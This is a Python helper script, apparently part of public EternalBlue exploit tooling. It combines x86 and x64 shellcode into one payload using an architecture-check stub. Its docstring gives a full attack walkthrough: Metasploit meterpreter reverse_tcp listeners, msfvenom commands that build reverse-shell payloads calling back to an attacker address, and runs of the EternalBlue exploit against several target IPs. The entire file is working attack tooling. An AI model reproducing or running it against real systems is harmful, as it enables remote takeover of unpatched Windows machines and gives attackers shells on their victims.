import sys
from struct import pack

if len(sys.argv) < 4:
	print('Usage: {} sc_x86 sc_x64 sc_out'.format(sys.argv[0]))
	sys.exit()

sc_x86 = open(sys.argv[1], 'rb').read()
sc_x64 = open(sys.argv[2], 'rb').read()

fp = open(sys.argv[3], 'wb')
'''
\x31\xc0		xor eax, eax
\x40			inc eax
\x0f\x84????	jz sc_x64
'''
fp.write('\x31\xc0\x40\x0f\x84'+pack('<I', len(sc_x86)))
fp.write(sc_x86)
fp.write(sc_x64)
fp.close()

'''
Example usage with metasploit meterpreter:

msf > use exploit/multi/handler 
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set EXITFUNC thread
msf exploit(handler) > set LHOST 0.0.0.0
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit -j
...
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 4445
msf exploit(handler) > exploit -j
...



$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.13.37 LPORT=4444
...
$ msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.13.37 LPORT=4445
...
$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
$ cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
$ python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
$ python eternalblue_exploit7.py 192.168.13.81 sc_all.bin
...
$ python eternalblue_exploit7.py 192.168.13.82 sc_all.bin
...
$ python eternalblue_exploit7.py 192.168.13.83 sc_all.bin
...
$ python eternalblue_exploit7.py 192.168.13.84 sc_all.bin
...
'''
